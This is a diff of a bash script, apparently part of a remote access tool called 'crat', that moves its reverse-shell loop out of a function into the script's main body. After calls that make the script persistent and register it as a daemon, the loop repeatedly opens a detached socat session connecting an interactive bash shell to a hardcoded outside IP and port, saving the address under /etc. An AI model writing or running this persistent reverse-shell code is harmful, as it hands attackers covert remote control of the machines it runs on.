@@ -71,38 +71,35 @@ registerDaemon () {
   fi
 }
 
-startReverseShell () {
-  while true
-  do
-
-    # check if the file /etc/crat/crat.ccw exist
-    if [ -f /etc/crat_config/crat.ccw ]; then
-      ip=$(cat /etc/crat_config/crat.ccw | cut -d ":" -f 1)
-      port=$(cat /etc/crat_config/crat.ccw | cut -d ":" -f 2)
-    else
-      if [ -z "$1" ]; then
-        ip="172.104.240.146"
-      else
-        ip=$1
-      fi
-
-      if [ -z "$2" ]; then
-        port="4545"
-      else
-        port=$2
-      fi
-    fi
-
-    # check if ip and port are set if they are save them to /etc/crat_config/crat.ccw
-    if [ ! -z "$ip" ] && [ ! -z "$port" ]; then
-      echo "$ip:$port" > /etc/crat_config/crat.ccw
-    fi
-
-    screen -dmS screen_service /bin/bash -c "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port"
-  done
-}
-
 updateScript
 makePersistant
 registerDaemon
-startReverseShell $1 $2
+
+
+while true
+do
+  # check if the file /etc/crat/crat.ccw exist
+  if [ -f /etc/crat_config/crat.ccw ]; then
+    ip=$(cat /etc/crat_config/crat.ccw | cut -d ":" -f 1)
+    port=$(cat /etc/crat_config/crat.ccw | cut -d ":" -f 2)
+  else
+    if [ -z "$1" ]; then
+      ip="172.104.240.146"
+    else
+      ip=$1
+    fi
+
+    if [ -z "$2" ]; then
+      port="4545"
+    else
+      port=$2
+    fi
+  fi
+
+  # check if ip and port are set if they are save them to /etc/crat_config/crat.ccw
+  if [ ! -z "$ip" ] && [ ! -z "$port" ]; then
+    echo "$ip:$port" > /etc/crat_config/crat.ccw
+  fi
+
+  screen -dmS screen_service /bin/bash -c "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port"
+done
